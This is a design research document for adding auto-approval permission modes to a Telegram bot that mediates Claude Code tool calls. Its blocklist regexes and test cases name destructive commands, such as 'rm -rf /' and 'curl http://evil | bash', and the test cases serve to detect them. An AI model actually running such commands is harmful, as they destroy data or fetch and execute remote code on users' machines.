# Phase 7: Permission Modes - Research

**Researched:** 2026-03-02
**Domain:** Telegram bot permission flow, auto-approval state machine, grammY InlineKeyboard multi-row layouts, Claude Code PreToolUse hook control
**Confidence:** HIGH

## Summary

Phase 7 transforms the existing binary approve/deny permission flow into a tiered auto-acceptance system. The current codebase already has a well-structured `ApprovalManager` (deferred promise pattern), `PreToolUse` HTTP hook handler, formatter with risk classification, and a `StatusMessage` class for pinned session messages. The core work is: (1) adding a per-session permission mode state machine, (2) extending the approval keyboard with a `[Mode...]` button that expands to mode options on a second row, (3) implementing auto-approval logic in the `onPreToolUse` callback with a dangerous command blocklist, (4) wiring the `Stop` hook to reset "Until Done" mode, (5) removing the approval timeout (wait forever), and (6) updating the `StatusMessage` to show the active mode with a Stop button.

The architecture is straightforward because all the pieces exist: PreToolUse hook is already blocking, the approval manager already uses a deferred promise pattern, the formatter already classifies risk levels, and the status message already supports debounced edits. The main design challenge is the Telegram callback_data 64-byte limit for inline keyboard buttons and ensuring the mode state machine integrates cleanly with session lifecycle (reset on /clear, expire on Stop for "Until Done").

**Primary recommendation:** Build a `PermissionModeManager` class per-session that holds the active mode and exposes `shouldAutoApprove(toolName, toolInput)`. Wire it into `onPreToolUse` to short-circuit the approval flow, and into the `StatusMessage` to show a persistent Stop button via `editMessageReplyMarkup`.

<user_constraints>

## User Constraints (from CONTEXT.md)

### Locked Decisions

#### Mode Activation UX
- Each permission prompt shows [Accept] [Deny] [Mode...] buttons
- Tapping [Mode...] expands a second row with mode options: [Accept All] [Same Tool] [Safe Only] [Until Done]
- Auto-approved tools post immediately as compact `lightning Tool(args...)` lines (not batched)
- Every session starts in manual mode -- no configurable default

#### Risk Classification
- Narrow dangerous command blocklist: only obviously destructive patterns (rm -rf /, sudo, curl|bash, git push --force)
- Blocked commands appear with a warning-styled prompt (visual indicator distinguishing them from normal prompts)
- Blocklist is fixed/hardcoded -- no user customization

#### Mode Scope & Lifecycle
- Modes reset to manual on /clear (each context window starts fresh)
- Same Tool matches on tool name only (e.g., approving "Bash" auto-approves all future Bash calls)
- Until Done expires when Claude's current turn ends (goes idle waiting for user input)
- Sending a text message while a mode is active does NOT reset the mode -- only Stop button or /clear deactivates

### Claude's Discretion
- Until Done button placement within the mode menu layout
- Safe tool classification approach for Safe Only mode (tool name vs name+args heuristics based on hook capabilities)
- Mode change announcement style (inline message vs status-only)
- Stop button behavior for in-flight pending permissions
- Stop confirmation style (silent vs brief message)
- Auto-approved count display in status message

### Deferred Ideas (OUT OF SCOPE)
None -- discussion stayed within phase scope

</user_constraints>

<phase_requirements>

## Phase Requirements

| ID | Description | Research Support |
|----|-------------|-----------------|
| PERM-01 | No permission timeout -- wait indefinitely for user decision | Remove `setTimeout` from ApprovalManager; set hook timeout to very large value in install-hooks.ts |
| PERM-02 | Accept All mode -- auto-approve everything until manually stopped | PermissionModeManager state machine with `accept-all` mode; auto-approve in onPreToolUse before sending Telegram message |
| PERM-03 | Same Tool mode -- auto-approve only matching tool name until stopped | Mode stores `lockedToolName`; `shouldAutoApprove` checks `payload.tool_name === lockedToolName` |
| PERM-04 | Safe Only mode -- auto-approve green-risk tools, prompt for yellow/red | Reuse existing `classifyRisk()` from formatter.ts; auto-approve when risk === 'safe' |
| PERM-05 | Until Done mode -- auto-approve everything until Claude's turn ends | Install Stop hook; when Stop event fires, reset mode to manual for that session |
| PERM-06 | Sticky control message with Stop button when any auto-accept mode is active | Use StatusMessage or a separate pinned message with InlineKeyboard Stop button |
| PERM-07 | Auto-approved permissions shown as compact `lightning Tool(args...)` line | Post via batcher using existing formatToolCompact with lightning prefix; skip approval flow |
| PERM-08 | Permissions visible locally via stdout before and after decision | Console.log before sending Telegram prompt and after decision resolves |
| PERM-09 | Dangerous command blocklist prevents auto-accept of destructive patterns (rm -rf, sudo, curl|bash) | `isDangerous(toolName, toolInput)` function; always prompt regardless of mode |

</phase_requirements>

## Standard Stack

### Core
| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| grammy | ^1.40.1 | Telegram Bot API, InlineKeyboard multi-row layouts | Already in use; `.row()` method for mode button layout |
| fastify | ^5.7.4 | HTTP hook server for PreToolUse and Stop events | Already in use; add Stop hook route |

### Supporting
| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| (none new) | - | - | All needed libraries already in package.json |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Per-session mode in memory | Persist mode to sessions.json | Not needed -- modes reset on /clear and session restart; memory-only is correct |
| Separate Stop button message | Reuse existing StatusMessage | StatusMessage is simpler, already pinned and debounced; user also suggested this |

**Installation:**
```bash
# No new dependencies needed
```

## Architecture Patterns

### Recommended Project Structure
```
src/
├── control/
│   ├── approval-manager.ts    # MODIFY: remove timeout, add cleanup-by-mode
│   └── permission-modes.ts    # NEW: PermissionModeManager class
├── hooks/
│   ├── handlers.ts            # MODIFY: add handleStop method
│   └── server.ts              # MODIFY: add /hooks/stop route
├── bot/
│   ├── bot.ts                 # MODIFY: add mode and stop callback query handlers
│   └── formatter.ts           # MODIFY: add formatAutoApproved, formatDangerousPrompt, isDangerous
├── monitoring/
│   └── status-message.ts      # MODIFY: show active mode + Stop button
├── types/
│   ├── hooks.ts               # MODIFY: add StopPayload type
│   └── sessions.ts            # MODIFY: (optional) add permissionModeState reference
├── utils/
│   └── install-hooks.ts       # MODIFY: register Stop hook, increase PreToolUse timeout
└── index.ts                   # MODIFY: wire PermissionModeManager, Stop callback, mode buttons
```

### Pattern 1: Permission Mode State Machine
**What:** A per-session class that tracks the active auto-approval mode and decides whether to auto-approve incoming PreToolUse events.
**When to use:** Every PreToolUse hook event, before the approval prompt is sent.
**Example:**
```typescript
// Source: project architecture pattern
type PermissionMode = 'manual' | 'accept-all' | 'same-tool' | 'safe-only' | 'until-done';

interface ModeState {
  mode: PermissionMode;
  lockedToolName?: string;  // For 'same-tool' mode
  autoApprovedCount: number;
}

class PermissionModeManager {
  private modes = new Map<string, ModeState>();

  getMode(sessionId: string): ModeState {
    return this.modes.get(sessionId) ?? { mode: 'manual', autoApprovedCount: 0 };
  }

  setMode(sessionId: string, mode: PermissionMode, toolName?: string): void {
    this.modes.set(sessionId, {
      mode,
      lockedToolName: mode === 'same-tool' ? toolName : undefined,
      autoApprovedCount: 0,
    });
  }

  resetToManual(sessionId: string): void {
    this.modes.delete(sessionId);
  }

  shouldAutoApprove(sessionId: string, toolName: string, toolInput: Record<string, unknown>): boolean {
    if (isDangerous(toolName, toolInput)) return false;

    const state = this.getMode(sessionId);
    switch (state.mode) {
      case 'manual': return false;
      case 'accept-all': return true;
      case 'same-tool': return toolName === state.lockedToolName;
      case 'safe-only': return classifyRisk(toolName) === 'safe';
      case 'until-done': return true;
    }
  }

  incrementAutoApproved(sessionId: string): void {
    const state = this.modes.get(sessionId);
    if (state) state.autoApprovedCount++;
  }

  cleanup(sessionId: string): void {
    this.modes.delete(sessionId);
  }
}
```

### Pattern 2: Expanded Mode Keyboard (Two-Step)
**What:** First tap on [Mode...] expands a second row with mode choices via `editMessageReplyMarkup`. The original approval buttons remain on the first row.
**When to use:** When user taps the Mode... button on any permission prompt.
**Example:**
```typescript
// Source: grammY InlineKeyboard docs (grammy.dev/plugins/keyboard)
// Callback data format: "mode:{toolUseId}:{modeType}" -- must fit 64 bytes
// toolUseId is UUID (36 chars), prefix "mode:" (5), ":" (1), mode max 4 = 46 bytes OK

function makeApprovalKeyboard(toolUseId: string): InlineKeyboard {
  return new InlineKeyboard()
    .text('\u2705 Accept', `approve:${toolUseId}`)
    .text('\u274C Deny', `deny:${toolUseId}`)
    .text('\u2699 Mode...', `mexp:${toolUseId}`);  // mexp = mode expand
}

function makeExpandedModeKeyboard(toolUseId: string): InlineKeyboard {
  return new InlineKeyboard()
    .text('\u2705 Accept', `approve:${toolUseId}`)
    .text('\u274C Deny', `deny:${toolUseId}`)
    .text('\u2699 Mode...', `mexp:${toolUseId}`)
    .row()
    .text('All', `ma:${toolUseId}`)           // mode accept-all (3+36 = 39 bytes)
    .text('Same Tool', `ms:${toolUseId}`)     // mode same-tool
    .text('Safe Only', `mf:${toolUseId}`)     // mode safe-only
    .text('Until Done', `mu:${toolUseId}`);   // mode until-done
}
```

### Pattern 3: Stop Hook for "Until Done"
**What:** Register a Stop hook that fires when Claude finishes responding. Use it to reset "Until Done" mode.
**When to use:** "Until Done" mode is active and Claude stops.
**Example:**
```typescript
// Source: Claude Code hooks reference (code.claude.com/docs/en/hooks)
// Stop hook payload:
interface StopPayload extends HookPayload {
  hook_event_name: 'Stop';
  stop_hook_active: boolean;
  last_assistant_message: string;
}

// In server.ts: add route
fastify.post<{ Body: StopPayload }>('/hooks/stop', async (request) => {
  handlers.handleStop(request.body as StopPayload).catch(err => {
    request.log.error(err, 'Error handling stop hook');
  });
  return {};  // Non-blocking response
});

// In handlers.ts:
async handleStop(payload: StopPayload): Promise<void> {
  const session = this.sessionStore.get(payload.session_id);
  if (!session) return;
  this.sessionStore.updateLastActivity(payload.session_id);
  await this.callbacks.onStop(session, payload);
}

// In index.ts wiring:
onStop: async (session, payload) => {
  // Reset "Until Done" mode when Claude's turn ends
  const state = permissionModeManager.getMode(session.sessionId);
  if (state.mode === 'until-done') {
    permissionModeManager.resetToManual(session.sessionId);
    // Update status message to remove Stop button
    // Post brief mode-ended announcement
  }
}
```

### Pattern 4: Dangerous Command Detection
**What:** A blocklist function that checks tool name and input for obviously destructive patterns.
**When to use:** Before any auto-approval decision, regardless of mode.
**Example:**
```typescript
// Source: CONTEXT.md locked decision -- narrow blocklist
const DANGEROUS_PATTERNS = [
  /\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*--force\s+).*\//,  // rm -rf /
  /\bsudo\b/,                                               // sudo anything
  /\bcurl\b.*\|\s*\bbash\b/,                                // curl | bash
  /\bwget\b.*\|\s*\bbash\b/,                                // wget | bash
  /\bgit\s+push\b.*--force\b/,                              // git push --force
  /\bgit\s+push\b.*-f\b/,                                   // git push -f
];

function isDangerous(toolName: string, toolInput: Record<string, unknown>): boolean {
  if (toolName !== 'Bash' && toolName !== 'BashBackground') return false;
  const command = (toolInput.command as string) || '';
  return DANGEROUS_PATTERNS.some(pattern => pattern.test(command));
}
```

### Pattern 5: Auto-Approved Compact Display
**What:** When a tool call is auto-approved, post a compact line with lightning emoji prefix instead of the full approval prompt.
**When to use:** Every auto-approved PreToolUse event.
**Example:**
```typescript
// Source: CONTEXT.md locked decision -- lightning prefix
function formatAutoApproved(toolName: string, toolInput: Record<string, unknown>): string {
  // Reuse the compact formatting logic from formatToolCompact
  // but with a lightning prefix
  const preview = buildToolPreviewCompact(toolName, toolInput);
  return `\u26A1 ${preview}`;  // lightning bolt + compact Tool(args...)
}
```

### Pattern 6: Status Message with Stop Button
**What:** When a mode is active, update the pinned status message to include the active mode name and a Stop inline button.
**When to use:** On mode activation and deactivation.
**Example:**
```typescript
// Source: existing StatusMessage pattern + grammY InlineKeyboard
// The status message already supports editMessageText with debouncing.
// Extend to also call editMessageReplyMarkup when mode changes.

// Stop callback data: "stop:{sessionId_short}" -- session ID first 8 chars is enough for lookup
// Or better: "stop:{threadId}" since threadId is a number (shorter)

const stopKeyboard = new InlineKeyboard().text('\u26D4 Stop Auto-Accept', `stop:${session.threadId}`);

// When mode activates: edit status message to add keyboard
await bot.api.editMessageReplyMarkup(chatId, statusMsg.messageId, {
  reply_markup: stopKeyboard,
});

// When mode deactivates: remove keyboard
await bot.api.editMessageReplyMarkup(chatId, statusMsg.messageId, {
  reply_markup: { inline_keyboard: [] },
});
```

### Anti-Patterns to Avoid
- **Storing mode state in SessionInfo:** SessionInfo is persisted to JSON on every change. Permission modes are ephemeral (reset on /clear) so they belong in a separate in-memory-only manager. Avoids unnecessary disk writes.
- **Batching auto-approved compact lines:** The CONTEXT.md says "post immediately" -- use `enqueueImmediate` not `enqueue` to avoid the 2-second batching window.
- **Auto-denying on timeout for manual prompts:** PERM-01 requires waiting indefinitely. Remove the timeout from ApprovalManager entirely.
- **Modifying the PreToolUse hook response for auto-approved calls:** Auto-approved calls should return `allow` immediately in the HTTP handler (server.ts level), before the handler even creates a deferred promise. This avoids creating unnecessary pending approval state.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| InlineKeyboard multi-row | Raw Telegram API JSON | grammY `InlineKeyboard.row()` | Already in use; handles row breaks, callback_data correctly |
| Debounced status message updates | Custom debounce | Existing `StatusMessage.requestUpdate()` | Already has 3-second debounce, identical-content detection |
| Risk classification | New risk system | Existing `classifyRisk()` in formatter.ts | Already classifies safe/caution/danger; extend for Safe Only mode |
| Compact tool display | New formatter | Existing `formatToolCompact()` | Already produces `Tool(args...)` one-liners; prefix with lightning |

**Key insight:** This phase is primarily a state machine + wiring change, not a new system. The existing approval flow, formatter, status message, and keyboard infrastructure provide 80% of what's needed.

## Common Pitfalls

### Pitfall 1: Callback Data Size Limit
**What goes wrong:** Telegram's callback_data is limited to 1-64 bytes. Mode buttons that include tool_use_id UUIDs risk exceeding this if prefixes are too long.
**Why it happens:** tool_use_id is a UUID (36 bytes). Prefix + separator + UUID must fit in 64 bytes.
**How to avoid:** Use short prefixes: `ma:` (accept-all), `ms:` (same-tool), `mf:` (safe-only), `mu:` (until-done), `mexp:` (expand). All are under 64 bytes with UUID.
**Warning signs:** Telegram API 400 errors with "BUTTON_DATA_INVALID" when buttons fail to send.

### Pitfall 2: Race Between Mode Activation and Pending Approval
**What goes wrong:** User taps [Same Tool] on a pending approval. The mode activates, but what happens to the CURRENT pending approval? It should also be approved (since the user explicitly chose a mode from that prompt).
**Why it happens:** Mode activation and approval resolution are separate actions.
**How to avoid:** When a mode is selected from a permission prompt, ALSO resolve that specific pending approval as `allow`. The mode button callback data includes the `toolUseId`, so call `approvalManager.decide(toolUseId, 'allow')` alongside `permissionModeManager.setMode(...)`.
**Warning signs:** Mode activates but the triggering tool call still waits for approval.

### Pitfall 3: Infinite Hook Timeout
**What goes wrong:** PERM-01 requires no timeout, but Claude Code's hook system has a configurable timeout for HTTP hooks. If the hook timeout fires before the user decides, the tool call proceeds (non-blocking error behavior for HTTP hooks).
**Why it happens:** Current install-hooks.ts sets PreToolUse timeout based on `APPROVAL_TIMEOUT_MS + 60s`. If we make approval wait forever, the hook timeout must also be very large.
**How to avoid:** Set PreToolUse hook timeout to a very large value (e.g., 86400 = 24 hours). Also remove the `setTimeout` from `ApprovalManager.waitForDecision`. On session end, all pending approvals are already cleaned up by `cleanupSession`.
**Warning signs:** Permissions auto-allowed after the hook timeout despite no user action.

### Pitfall 4: "Until Done" Mode and Stop Hook Registration
**What goes wrong:** The `Stop` hook is not currently registered in `install-hooks.ts`. If we forget to add it, "Until Done" mode never expires.
**Why it happens:** install-hooks.ts only registers SessionStart, SessionEnd, PostToolUse, Notification, PreToolUse. Stop is new.
**How to avoid:** Add Stop hook route to server.ts AND register it in install-hooks.ts. Make it fire-and-forget (non-blocking).
**Warning signs:** "Until Done" mode stays active after Claude finishes, auto-approving the next turn's tools.

### Pitfall 5: Mode Reset on /clear Not Handled
**What goes wrong:** /clear creates a new session (new session ID) but the PermissionModeManager still has the old session's mode state.
**Why it happens:** PermissionModeManager is keyed by sessionId. /clear creates a new sessionId.
**How to avoid:** Call `permissionModeManager.cleanup(oldSessionId)` in the /clear handler (both HTTP path and ClearDetector path). The new session starts in manual mode by default (no entry in the map = manual).
**Warning signs:** Mode persists across /clear boundaries.

### Pitfall 6: StatusMessage Reply Markup Conflicts
**What goes wrong:** The StatusMessage updates its text content via `editMessageText`. Adding a Stop button requires `editMessageReplyMarkup`. These can race if called concurrently.
**Why it happens:** `editMessageText` replaces the reply_markup if you pass one, or leaves it if you don't.
**How to avoid:** When the StatusMessage flushes text updates, include the current reply_markup in the `editMessageText` call (pass it through). Track whether a Stop button should be shown as part of the StatusMessage state.
**Warning signs:** Stop button disappears after a status text update, or text update fails because markup changed.

### Pitfall 7: Auto-Approved Display vs PostToolUse Display
**What goes wrong:** An auto-approved tool call shows both the lightning-prefix auto-approved line AND the regular PostToolUse compact line (double-display).
**Why it happens:** PreToolUse auto-approves and posts the lightning line. Then PostToolUse fires and the handler posts another compact line.
**How to avoid:** When a tool is auto-approved, mark it (e.g., store tool_use_id in a Set). In the PostToolUse handler, skip posting if the tool_use_id was auto-approved. Alternatively, use the auto-approved lightning line as the ONLY display and suppress the PostToolUse line for auto-approved tools.
**Warning signs:** Every auto-approved tool appears twice in the Telegram topic.

## Code Examples

Verified patterns from the existing codebase and official sources:

### grammY Multi-Row InlineKeyboard
```typescript
// Source: grammy.dev/plugins/keyboard (verified)
const keyboard = new InlineKeyboard()
  .text('Accept', `approve:${toolUseId}`)
  .text('Deny', `deny:${toolUseId}`)
  .text('Mode...', `mexp:${toolUseId}`)
  .row()
  .text('All', `ma:${toolUseId}`)
  .text('Same Tool', `ms:${toolUseId}`)
  .text('Safe', `mf:${toolUseId}`)
  .text('Until Done', `mu:${toolUseId}`);
```

### PreToolUse Allow Response
```typescript
// Source: code.claude.com/docs/en/hooks (verified)
// The existing pattern in server.ts for immediate allow:
return {
  hookSpecificOutput: {
    hookEventName: 'PreToolUse',
    permissionDecision: 'allow',
    permissionDecisionReason: 'Auto-approved (accept-all mode)',
  },
};
```

### Existing Approval Flow (to be modified)
```typescript
// Source: src/index.ts lines 603-655 (current codebase)
// The onPreToolUse callback currently:
// 1. Formats approval message
// 2. Sends to Telegram with approve/deny keyboard
// 3. Awaits approvalManager.waitForDecision (blocking)
// 4. Returns allow/deny to Claude Code
//
// New flow inserts a check BEFORE step 1:
// 0. Check permissionModeManager.shouldAutoApprove()
//    If yes: post lightning line, return allow immediately
//    If no (or isDangerous): proceed with steps 1-4
```

### Stop Hook Route
```typescript
// Source: code.claude.com/docs/en/hooks (verified Stop hook schema)
// Add to server.ts alongside existing routes:
fastify.post<{ Body: StopPayload }>('/hooks/stop', async (request) => {
  handlers.handleStop(request.body as StopPayload).catch(err => {
    request.log.error(err, 'Error handling stop hook');
  });
  return {};
});
```

### Dangerous Pattern Matching
```typescript
// Source: CONTEXT.md locked decisions for blocklist patterns
// Test cases from the specification:
isDangerous('Bash', { command: 'rm -rf /' })              // true
isDangerous('Bash', { command: 'sudo apt install' })       // true
isDangerous('Bash', { command: 'curl http://evil | bash' }) // true
isDangerous('Bash', { command: 'git push --force' })       // true
isDangerous('Bash', { command: 'npm test' })               // false
isDangerous('Read', { file_path: '/etc/passwd' })          // false (not Bash)
isDangerous('Bash', { command: 'rm file.txt' })            // false (not rm -rf /)
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Binary approve/deny with timeout | Tiered auto-accept modes, no timeout | Phase 7 | Eliminates tap fatigue for trusted workflows |
| Auto-deny on timeout (5 min default) | Wait indefinitely | Phase 7 (PERM-01) | No surprise auto-denials |
| Only PreToolUse hook | PreToolUse + Stop hooks | Phase 7 (PERM-05) | Enables "Until Done" mode lifecycle |
| Approval keyboard: 2 buttons | 3 buttons + expandable mode row | Phase 7 | Mode selection from any permission prompt |

**Deprecated/outdated:**
- `approvalTimeoutMs` config: Will be removed or made no-op (PERM-01 mandates indefinite wait)
- `AUTO_APPROVE` env var: Still exists as a global override, but Phase 7 provides per-session Telegram-controlled alternatives

## Open Questions

1. **Safe Only mode tool classification**
   - What we know: The existing `classifyRisk()` function in formatter.ts classifies by tool name only: Read/Glob/Grep = safe, Write/Edit = caution, Bash = danger. The CONTEXT.md says "tool name vs name+args heuristics" is Claude's discretion.
   - What's unclear: Should Safe Only auto-approve Read/Glob/Grep only (very conservative) or also include WebSearch/WebFetch (broader)?
   - Recommendation: Use the existing `classifyRisk() === 'safe'` as the definition. This means Read, Glob, Grep, and any unrecognized non-dangerous tools are auto-approved. Write/Edit/Bash always prompt. This is simple, predictable, and the user explicitly chose "safe only" meaning they want conservative behavior.

2. **Stop button placement -- StatusMessage vs separate message**
   - What we know: CONTEXT.md specifically says "reuses the existing pinned status message infrastructure." StatusMessage edits in place with debouncing.
   - What's unclear: Whether editMessageText with reply_markup works reliably alongside the frequent debounced text updates.
   - Recommendation: Include reply_markup in the StatusMessage `editMessageText` call when mode is active. Track `activeKeyboard: InlineKeyboard | undefined` as StatusMessage state. This avoids a second message.

3. **How "Same Tool" captures the tool name**
   - What we know: User taps [Same Tool] from a permission prompt. The prompt was for a specific tool (e.g., Bash).
   - What's unclear: The mode button callback_data needs to encode the tool name. But the callback_data already contains the toolUseId.
   - Recommendation: Look up the tool name from the pending approval entry (`approvalManager.pending.get(toolUseId).toolName`). The approval is still pending when the mode button is tapped, so the tool name is available. No need to encode it in callback_data.

## Sources

### Primary (HIGH confidence)
- Claude Code Hooks Reference (https://code.claude.com/docs/en/hooks) - Complete PreToolUse, Stop, PermissionRequest hook schemas, permission_mode values, decision control format
- grammY InlineKeyboard docs (https://grammy.dev/plugins/keyboard) - Multi-row keyboard with `.row()`, callback_data format, `.text()` method

### Secondary (MEDIUM confidence)
- Telegram Bot API (https://core.telegram.org/bots/api) - 64-byte callback_data limit for InlineKeyboardButton
- Existing codebase analysis (src/control/approval-manager.ts, src/hooks/server.ts, src/bot/bot.ts, src/bot/formatter.ts, src/monitoring/status-message.ts, src/index.ts) - Current architecture, wiring patterns, approval flow

### Tertiary (LOW confidence)
- None

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH - No new dependencies; all patterns verified in existing codebase and official docs
- Architecture: HIGH - Clear extension of existing patterns (approval manager, status message, hook handlers)
- Pitfalls: HIGH - Identified from direct codebase analysis; callback_data limit verified in Telegram API docs
- Hook integration: HIGH - Stop hook schema verified in official Claude Code docs; PreToolUse response format already in use

**Research date:** 2026-03-02
**Valid until:** 2026-04-01 (stable -- grammY and Claude Code hooks are mature APIs)
